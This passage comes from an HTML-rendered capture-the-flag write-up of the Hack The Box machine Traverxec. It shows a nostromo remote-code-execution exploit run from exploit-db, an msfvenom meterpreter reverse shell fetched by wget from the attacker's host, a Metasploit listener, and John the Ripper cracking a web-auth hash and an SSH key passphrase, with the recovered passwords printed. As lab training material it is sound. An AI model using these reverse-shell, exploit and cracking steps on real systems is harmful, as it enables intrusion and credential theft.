</span></span><span class=line><span class=cl>   <span class=n>SRVPORT</span>  <span class=mi>8080</span>             <span class=n>yes</span>       <span class=n>The</span> <span class=n>local</span> <span class=n>port</span> <span class=n>to</span> <span class=n>listen</span> <span class=n>on</span><span class=o>.</span>
</span></span><span class=line><span class=cl>   <span class=n>SSL</span>      <span class=bp>false</span>            <span class=n>no</span>        <span class=n>Negotiate</span> <span class=n>SSL</span><span class=o>/</span><span class=n>TLS</span> <span class=k>for</span> <span class=n>outgoing</span> <span class=n>connections</span>
</span></span><span class=line><span class=cl>   <span class=n>SSLCert</span>                   <span class=n>no</span>        <span class=ne>Path</span> <span class=n>to</span> <span class=n>a</span> <span class=n>custom</span> <span class=n>SSL</span> <span class=n>certificate</span> <span class=p>(</span><span class=n>default</span> <span class=n>is</span> <span class=n>randomly</span> <span class=n>generated</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>URIPATH</span>                   <span class=n>no</span>        <span class=n>The</span> <span class=n>URI</span> <span class=n>to</span> <span class=n>use</span> <span class=k>for</span> <span class=n>this</span> <span class=n>exploit</span> <span class=p>(</span><span class=n>default</span> <span class=n>is</span> <span class=n>random</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>VHOST</span>                     <span class=n>no</span>        <span class=n>HTTP</span> <span class=n>server</span> <span class=n>virtual</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Payload</span> <span class=n>options</span> <span class=p>(</span><span class=n>cmd</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>reverse_perl</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Name</span>   <span class=n>Current</span> <span class=n>Setting</span>  <span class=n>Required</span>  <span class=n>Description</span>
</span></span><span class=line><span class=cl>   <span class=o>----</span>   <span class=o>---------------</span>  <span class=o>--------</span>  <span class=o>-----------</span>
</span></span><span class=line><span class=cl>   <span class=n>LHOST</span>                   <span class=n>yes</span>       <span class=n>The</span> <span class=n>listen</span> <span class=n>address</span> <span class=p>(</span><span class=n>an</span> <span class=n>interface</span> <span class=n>may</span> <span class=n>be</span> <span class=n>specified</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>LPORT</span>  <span class=mi>4444</span>             <span class=n>yes</span>       <span class=n>The</span> <span class=n>listen</span> <span class=n>port</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Exploit</span> <span class=n>target</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>Id</span>  <span class=n>Name</span>
</span></span><span class=line><span class=cl>   <span class=o>--</span>  <span class=o>----</span>
</span></span><span class=line><span class=cl>   <span class=mi>0</span>   <span class=n>Automatic</span> <span class=p>(</span><span class=n>Unix</span> <span class=n>In</span><span class=o>-</span><span class=n>Memory</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>But the perl reverse shell obtained with MSF was really unstable even when
upgrading it to bash with <code>python -c 'import pty; pty.spawn("/bin/bash")'</code>.</p><p>So I put the MSF shell in background and choose to use the python exploit the upload and
execute a meterpreter reverse shell.</p><p>We could nearly directly execute it from EDB but we need to remove a line
to be able to execute it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sed &#39;10d&#39; /usr/share/exploitdb/exploits/multiple/remote/47837.py | python - 10.10.10.165 80 id
</span></span></code></pre></td></tr></table></div></div><p>Port 4444 was not reached back so I generated a reverse shell for port 80 with
<code>msfvenom</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=80 -f elf &gt; 80.bin
</span></span></code></pre></td></tr></table></div></div><p>Then started a new MSF console as root to be able to bind port 80 and start a
listener:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>sudo</span> <span class=n>msfconsole</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>use</span> <span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span> 
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>LHOST</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.236</span>
</span></span><span class=line><span class=cl><span class=n>LHOST</span> <span class=o>=&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.236</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>payload</span> <span class=n>linux</span><span class=o>/</span><span class=n>x64</span><span class=o>/</span><span class=n>meterpreter</span><span class=o>/</span><span class=n>reverse_tcp</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=&gt;</span> <span class=n>linux</span><span class=o>/</span><span class=n>x64</span><span class=o>/</span><span class=n>meterpreter</span><span class=o>/</span><span class=n>reverse_tcp</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>LPORT</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=n>LPORT</span> <span class=o>=&gt;</span> <span class=mi>80</span>
</span></span></code></pre></td></tr></table></div></div><p>Then I witched back to my first MSF session with <code>session -i</code> and downloaded
the reverse shell bin.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>wget http://10.10.14.236/80.bin -o /tmp/80.bin
</span></span></code></pre></td></tr></table></div></div><p>Then <code>chmod</code> and execute it.</p><h3 id=privilege-escalation-of-machine--www-data-to-david>Privilege Escalation of Machine : www-data to david<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--www-data-to-david>#</a></h3><p><strong>TL;DR</strong>: check nostromo conf, find user web dirs, find archive containing a
SSH key, crack it and use it to gain SSH access</p><p>Now that we have a proper shell let&rsquo;s see what can we find on the system.</p><p>We can start by reading nostromo configuration file
<code>/var/nostromo/conf/nhttpd.conf</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># MAIN [MANDATORY]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>servername</span>              <span class=n>traverxec</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=n>serverlisten</span>            <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>serveradmin</span>             <span class=n>david</span><span class=err>@</span><span class=n>traverxec</span><span class=o>.</span><span class=n>htb</span>
</span></span><span class=line><span class=cl><span class=n>serverroot</span>              <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>nostromo</span>
</span></span><span class=line><span class=cl><span class=n>servermimes</span>             <span class=n>conf</span><span class=o>/</span><span class=n>mimes</span>
</span></span><span class=line><span class=cl><span class=n>docroot</span>                 <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>nostromo</span><span class=o>/</span><span class=n>htdocs</span>
</span></span><span class=line><span class=cl><span class=n>docindex</span>                <span class=n>index</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># LOGS [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>logpid</span>                  <span class=n>logs</span><span class=o>/</span><span class=n>nhttpd</span><span class=o>.</span><span class=n>pid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SETUID [RECOMMENDED]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>user</span>                    <span class=n>www</span><span class=o>-</span><span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># BASIC AUTHENTICATION [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>htaccess</span>                <span class=o>.</span><span class=n>htaccess</span>
</span></span><span class=line><span class=cl><span class=n>htpasswd</span>                <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>nostromo</span><span class=o>/</span><span class=n>conf</span><span class=o>/.</span><span class=n>htpasswd</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ALIASES [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>icons</span>                  <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>nostromo</span><span class=o>/</span><span class=n>icons</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># HOMEDIRS [OPTIONAL]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>homedirs</span>                <span class=o>/</span><span class=n>home</span>
</span></span><span class=line><span class=cl><span class=n>homedirs_public</span>         <span class=n>public_www</span>
</span></span></code></pre></td></tr></table></div></div><p>What is useful to know in it?</p><ul><li><code>serveradmin david@traverxec.htb</code> &ndash;> The admin is david</li><li><code>user www-data</code> &ndash;> the webserver user is <code>www-data</code> but we already know it by executing <code>id</code></li><li><code>htaccess .htaccess</code> &ndash;> Some part of the website is protected by a basic auth</li><li><code>htpasswd /var/nostromo/conf/.htpasswd</code> &ndash;> the location of the basic auth creds</li><li><code>homedirs /home</code> &ndash;> users are able to serve a website in their home directory</li><li><code>homedirs_public public_www</code> &ndash;> the root folder of user web server is <code>~/public_www/</code></li></ul><p>Then we can find the basic auth creds in <code>/var/nostromo/conf/.htpasswd</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
</span></span></code></pre></td></tr></table></div></div><p>We can crack the password with <a href=https://www.openwall.com/john/>John the Ripper (JtR)</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>john</span> <span class=o>--</span><span class=n>wordlist</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>detected</span> <span class=nb>hash</span> <span class=n>type</span> <span class=s2>&#34;md5crypt&#34;</span><span class=p>,</span> <span class=n>but</span> <span class=n>the</span> <span class=n>string</span> <span class=n>is</span> <span class=n>also</span> <span class=n>recognized</span> <span class=n>as</span> <span class=s2>&#34;md5crypt-long&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--format=md5crypt-long&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>force</span> <span class=n>loading</span> <span class=n>these</span> <span class=n>as</span> <span class=n>that</span> <span class=n>type</span> <span class=n>instead</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>detected</span> <span class=nb>hash</span> <span class=n>type</span> <span class=s2>&#34;md5crypt&#34;</span><span class=p>,</span> <span class=n>but</span> <span class=n>the</span> <span class=n>string</span> <span class=n>is</span> <span class=n>also</span> <span class=n>recognized</span> <span class=n>as</span> <span class=s2>&#34;md5crypt-opencl&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--format=md5crypt-opencl&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>force</span> <span class=n>loading</span> <span class=n>these</span> <span class=n>as</span> <span class=n>that</span> <span class=n>type</span> <span class=n>instead</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>md5crypt</span><span class=p>,</span> <span class=n>crypt</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>$</span><span class=mi>1</span><span class=o>$</span> <span class=p>(</span><span class=ow>and</span> <span class=n>variants</span><span class=p>)</span> <span class=p>[</span><span class=n>MD5</span> <span class=mi>128</span><span class=o>/</span><span class=mi>128</span> <span class=n>AVX</span> <span class=mi>4</span><span class=n>x3</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>2</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>Nowonly4me</span>       <span class=p>(</span><span class=n>david</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=n>g</span> <span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>01</span><span class=p>:</span><span class=mi>54</span> <span class=n>DONE</span> <span class=p>(</span><span class=mi>2020</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=mi>12</span> <span class=mi>16</span><span class=p>:</span><span class=mi>00</span><span class=p>)</span> <span class=mf>0.008768</span><span class=n>g</span><span class=o>/</span><span class=n>s</span> <span class=mi>92750</span><span class=n>p</span><span class=o>/</span><span class=n>s</span> <span class=mi>92750</span><span class=n>c</span><span class=o>/</span><span class=n>s</span> <span class=mi>92750</span><span class=n>C</span><span class=o>/</span><span class=n>s</span> <span class=n>Noyoo</span><span class=o>..</span><span class=n>NovemberRain</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--show&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>display</span> <span class=n>all</span> <span class=n>of</span> <span class=n>the</span> <span class=n>cracked</span> <span class=n>passwords</span> <span class=n>reliably</span>
</span></span><span class=line><span class=cl><span class=n>Session</span> <span class=n>completed</span>
</span></span></code></pre></td></tr></table></div></div><p>So the basic auth creds are <code>david</code> / <code>Nowonly4me</code>.</p><p>David home web server is stored in <code>/home/david/public_www/</code> and is served as
<code>http://10.10.10.165/~david/</code>.</p><p>Let&rsquo;s see what is stored in <code>/home/david/public_www/</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ls -lhA /home/david/public_www
</span></span><span class=line><span class=cl>total 8.0K
</span></span><span class=line><span class=cl>-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
</span></span><span class=line><span class=cl>drwxr-xr-x 2 david david 4.0K Oct 25 17:02 protected-file-area
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ls -lha /home/david/public_www/protected-file-area
</span></span><span class=line><span class=cl>total 16K
</span></span><span class=line><span class=cl>drwxr-xr-x 2 david david 4.0K Oct 25 17:02 .
</span></span><span class=line><span class=cl>drwxr-xr-x 3 david david 4.0K Oct 25 15:45 ..
</span></span><span class=line><span class=cl>-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
</span></span><span class=line><span class=cl>-rw-r--r-- 1 david david 1.9K Oct 25 17:02 backup-ssh-identity-files.tgz
</span></span></code></pre></td></tr></table></div></div><p>We could access <code>http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz</code>
with the basic auth creds we leaked earlier or just copy
<code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code>.</p><p>Then we can see what&rsquo;s inside the archive and extract it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ tar tvf backup-ssh-identity-files.tgz
</span></span><span class=line><span class=cl>drwx------ david/david       0 2019-10-25 23:02 home/david/.ssh/
</span></span><span class=line><span class=cl>-rw-r--r-- david/david     397 2019-10-25 23:02 home/david/.ssh/authorized_keys
</span></span><span class=line><span class=cl>-rw------- david/david    1766 2019-10-25 23:02 home/david/.ssh/id_rsa
</span></span><span class=line><span class=cl>-rw-r--r-- david/david     397 2019-10-25 23:02 home/david/.ssh/id_rsa.pub
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ tar xaf backup-ssh-identity-files.tgz
</span></span></code></pre></td></tr></table></div></div><p>The private key is encrypted and password protected, so we need to crack it to
be able to use it.</p><p>So I converted the RSA private key in a format understandable by <a href=https://www.openwall.com/john/>JtR</a> and
cracked it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh2john</span> <span class=n>home</span><span class=o>/</span><span class=n>david</span><span class=o>/.</span><span class=n>ssh</span><span class=o>/</span><span class=n>id_rsa</span> 
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>ssh2john</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span> <span class=n>DeprecationWarning</span><span class=p>:</span> <span class=n>decodestring</span><span class=p>()</span> <span class=n>is</span> <span class=n>a</span> <span class=n>deprecated</span> <span class=n>alias</span> <span class=n>since</span> <span class=n>Python</span> <span class=mf>3.1</span><span class=p>,</span> <span class=n>use</span> <span class=n>decodebytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>  <span class=n>data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>decodestring</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>home</span><span class=o>/</span><span class=n>david</span><span class=o>/.</span><span class=n>ssh</span><span class=o>/</span><span class=n>id_rsa</span><span class=p>:</span><span class=o>$</span><span class=n>sshng</span><span class=o>$</span><span class=mi>1</span><span class=o>$</span><span class=mi>16</span><span class=o>$</span><span class=mi>477</span><span class=n>EEFFBA56F9D283D349033D5D08C4F</span><span class=o>$</span><span class=mi>1200</span><span class=o>$</span><span class=n>b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>john</span> <span class=o>--</span><span class=n>wordlist</span><span class=o>=/</span><span class=n>usr</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>wordlists</span><span class=o>/</span><span class=n>password</span><span class=o>/</span><span class=n>rockyou</span><span class=o>.</span><span class=n>txt</span> <span class=n>john</span><span class=o>.</span><span class=n>txt</span> 
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>detected</span> <span class=nb>hash</span> <span class=n>type</span> <span class=s2>&#34;SSH&#34;</span><span class=p>,</span> <span class=n>but</span> <span class=n>the</span> <span class=n>string</span> <span class=n>is</span> <span class=n>also</span> <span class=n>recognized</span> <span class=n>as</span> <span class=s2>&#34;ssh-opencl&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Use</span> <span class=n>the</span> <span class=s2>&#34;--format=ssh-opencl&#34;</span> <span class=n>option</span> <span class=n>to</span> <span class=n>force</span> <span class=n>loading</span> <span class=n>these</span> <span class=n>as</span> <span class=n>that</span> <span class=n>type</span> <span class=n>instead</span>
</span></span><span class=line><span class=cl><span class=n>Using</span> <span class=n>default</span> <span class=n>input</span> <span class=n>encoding</span><span class=p>:</span> <span class=n>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>Loaded</span> <span class=mi>1</span> <span class=n>password</span> <span class=nb>hash</span> <span class=p>(</span><span class=n>SSH</span> <span class=p>[</span><span class=n>RSA</span><span class=o>/</span><span class=n>DSA</span><span class=o>/</span><span class=n>EC</span><span class=o>/</span><span class=n>OPENSSH</span> <span class=p>(</span><span class=n>SSH</span> <span class=n>private</span> <span class=n>keys</span><span class=p>)</span> <span class=mi>32</span><span class=o>/</span><span class=mi>64</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>1</span> <span class=p>(</span><span class=n>KDF</span><span class=o>/</span><span class=n>cipher</span> <span class=p>[</span><span class=mi>0</span><span class=o>=</span><span class=n>MD5</span><span class=o>/</span><span class=n>AES</span> <span class=mi>1</span><span class=o>=</span><span class=n>MD5</span><span class=o>/</span><span class=mi>3</span><span class=n>DES</span> <span class=mi>2</span><span class=o>=</span><span class=n>Bcrypt</span><span class=o>/</span><span class=n>AES</span><span class=p>])</span> <span class=n>is</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Cost</span> <span class=mi>2</span> <span class=p>(</span><span class=n>iteration</span> <span class=n>count</span><span class=p>)</span> <span class=n>is</span> <span class=mi>1</span> <span class=k>for</span> <span class=n>all</span> <span class=n>loaded</span> <span class=n>hashes</span>
</span></span><span class=line><span class=cl><span class=n>Will</span> <span class=n>run</span> <span class=mi>2</span> <span class=n>OpenMP</span> <span class=n>threads</span>
</span></span><span class=line><span class=cl><span class=n>Note</span><span class=p>:</span> <span class=n>This</span> <span class=n>format</span> <span class=n>may</span> <span class=n>emit</span> <span class=bp>false</span> <span class=n>positives</span><span class=p>,</span> <span class=n>so</span> <span class=n>it</span> <span class=n>will</span> <span class=n>keep</span> <span class=n>trying</span> <span class=n>even</span> <span class=n>after</span>
</span></span><span class=line><span class=cl><span class=n>finding</span> <span class=n>a</span> <span class=n>possible</span> <span class=n>candidate</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>Press</span> <span class=s1>&#39;q&#39;</span> <span class=ow>or</span> <span class=n>Ctrl</span><span class=o>-</span><span class=n>C</span> <span class=n>to</span> <span class=n>abort</span><span class=p>,</span> <span class=n>almost</span> <span class=n>any</span> <span class=n>other</span> <span class=n>key</span> <span class=k>for</span> <span class=n>status</span>
</span></span><span class=line><span class=cl><span class=n>hunter</span>           <span class=p>(</span><span class=err>?</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Warning</span><span class=p>:</span> <span class=n>Only</span> <span class=mi>1</span> <span class=n>candidate</span> <span class=n>left</span><span class=p>,</span> <span class=n>minimum</span> <span class=mi>2</span> <span class=n>needed</span> <span class=k>for</span> <span class=n>performance</span><span class=o>.</span>
